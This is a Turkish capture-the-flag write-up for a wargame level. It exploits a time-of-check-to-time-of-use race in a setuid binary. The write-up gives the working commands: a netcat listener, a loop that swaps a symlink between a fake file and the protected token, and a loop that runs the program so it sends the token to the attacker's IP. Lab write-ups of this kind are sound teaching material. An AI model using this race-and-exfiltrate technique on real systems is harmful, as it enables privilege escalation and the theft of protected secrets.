# LEVEL 10 Writeup

# `Source Code`

![source code](img/level10_source_code.png)

Bu seviye için level10 kullanıcısına geçmeniz gerekmektedi. `username : level10 password : level10` . Bu seviyeye ait dosyaları `/home/flag10` dizininde bulabilirsiniz.

Dizinimizde bulunan `flag10` dosyası `access` sistem çağrısının gereksinimleri karşılandığı sürece verilen herhangi bir dosyayı yüklüyormuş.

Bu sorumuzda klasik `Time Of Check To Time Of Use (TOCTTOU)` zafiyeti mevcut. Access fonksiyonu aşağıda open() işlevini kullanırken kullanıcının UID'si ile dosyaya erişme yetkisi olup olmadığını anlamak için işlemin gerçek UID'sini karşılaştırarak kontrol işlemi gerçekleştirir.

Gerçek UID'ye ait bir dosyayı işaret eden bir bağlantı dosyasını okutarak programı yarıştırabiliriz ve `access()`'den sonra `open()`'dan önce `token` dosyamızı belirteç dosyamızı gösterecek şekilde değiştirebiliriz.

Ana makinemizde `nc -vlknp 18211` komutuyla dinlemeye alalım. (Bu portu kullanmamızın sebebi programımızın o porta bağlantı isteği atması)

Makinemizde bir ekranda şu komutu çalıştıralım...

     while :; do ln -fs /tmp/faketoken /tmp/token; ln -fs /home/flag10/token /tmp/token; done

Makinemizde ikinci bir ekran açıp orda da şu komutu çalıştıralım...

    while :; do /home/flag10/flag10 /tmp/token 192.168.0.12 ; done

Daha sonra ana makinemizde çalıştırdığımız `nc` bağlantısına gelip işlemi durduralım.

![0](img/level10_0.png)

Parolamızı bulduk flag10 kullanıcısı olarak giriş yapmaya çalışalım.

![1](img/level10_1.png)

Seviyemizi başasrılı bir şekilde tamamlamış olduk.
